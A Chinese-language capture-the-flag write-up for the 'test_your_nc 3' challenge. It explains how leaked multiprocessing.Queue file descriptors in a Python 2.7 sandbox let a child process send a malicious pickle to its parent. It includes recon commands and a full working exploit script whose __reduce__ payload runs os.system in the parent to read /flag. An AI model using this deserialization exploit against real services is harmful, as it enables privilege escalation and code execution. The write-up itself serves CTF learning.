# test_your_nc 3

## 题目简述

题目是 nc 交互环境。连接后可执行有限命令，系统中存在 `python /bin/114sh` 进程。查看脚本可知服务端将用户命令放入降权沙盒执行，并通过 Python `multiprocessing.Queue` 接收子进程结果。

## 解题过程

### 关键机制

服务端使用 Python 2.7。Python 3.4 之前 `subprocess` 默认不会关闭所有 fd，容易把父进程的 Queue 管道 fd 泄露给子进程。`multiprocessing.Queue` 底层使用 pickle 序列化对象，因此只要能向 Queue 的写端 fd 发送合法 pickle 消息，就能让父进程反序列化并执行命令。

参考 URL：https://github.com/python/cpython/blob/main/Lib/multiprocessing/connection.py#L373

### 求解步骤

先用命令确认进程和 fd：

```shell
ps -ef
cat /bin/114sh
ls -la /proc/self/fd
```

构造与 `multiprocessing.connection.Connection` 相同的发送格式：4 字节网络序长度 + pickle 数据。pickle 对象的 `__reduce__` 返回 `os.system("cat /flag")`。

```python
import os, struct, pickle

class Connection:
    def __init__(self, handle):
        self._handle = handle

    def _send(self, buf):
        while buf:
            n = os.write(self._handle, buf)
            buf = buf[n:]

    def send(self, obj):
        payload = pickle.dumps(obj)
        self._send(struct.pack("!i", len(payload)) + payload)

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system, ("cat /flag",))

os.system("ls -la /proc/self/fd")
for fd in range(5, 10):
    try:
        Connection(fd).send(PickleRCE())
    except Exception:
        pass
```

脚本在沙盒子进程中运行，但向泄露的 Queue fd 写入数据，父进程读取后触发反序列化，命令在父进程上下文执行，读取 `/flag`。

## 方法总结

- 漏洞链：Python 2.7 fd 泄露 + Queue pickle 反序列化。
- 关键不是直接逃沙箱，而是借泄露 fd 向父进程通信管道注入 pickle。
- `Connection._send_bytes` 的长度前缀格式必须正确，否则父进程不会按 pickle 对象解析。
